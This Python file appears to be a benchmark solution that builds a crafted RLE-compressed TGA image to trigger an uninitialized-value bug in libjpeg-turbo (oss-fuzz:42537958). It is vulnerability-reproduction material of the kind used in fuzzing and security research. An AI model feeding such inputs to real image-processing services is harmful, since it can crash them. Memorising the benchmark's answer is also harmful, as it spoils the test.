import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers an uninitialized value
        vulnerability in libjpeg-turbo (oss-fuzz:42537958).

        The vulnerability is triggered by specific image parameters (64x7, 48bpp)
        leading to a crash during compression. This PoC uses a compact,
        RLE-compressed TGA file format to represent these parameters, resulting
        in a much smaller file size than the uncompressed ground-truth PoC
        while still triggering the same vulnerable code path.
        """
        # TGA Header (18 bytes)
        id_length = 0
        colormap_type = 0
        image_type = 10  # 10 = Run-Length Encoded, True-Color Image

        header = bytearray()
        header.append(id_length)
        header.append(colormap_type)
        header.append(image_type)
        header.extend(b'\x00' * 5)  # Colormap Specification (unused)

        # Image Specification (10 bytes)
        x_origin = 0
        y_origin = 0
        width = 64
        height = 7
        pixel_depth = 48  # 16 bits per component (RGB)
        image_descriptor = 0

        header.extend(struct.pack('<HH', x_origin, y_origin))
        header.extend(struct.pack('<HH', width, height))
        header.append(pixel_depth)
        header.append(image_descriptor)

        # RLE Image Data for a solid black 64x7 image (448 pixels)
        # 448 pixels = 3 packets of 128 pixels + 1 packet of 64 pixels
        pixel_data = bytearray()
        black_pixel_48bit = b'\x00' * 6

        # 3 packets for 128 pixels each
        rle_header_128 = 0x80 | (128 - 1)
        for _ in range(3):
            pixel_data.append(rle_header_128)
            pixel_data.extend(black_pixel_48bit)

        # 1 packet for the remaining 64 pixels
        rle_header_64 = 0x80 | (64 - 1)
        pixel_data.append(rle_header_64)
        pixel_data.extend(black_pixel_48bit)

        return bytes(header) + bytes(pixel_data)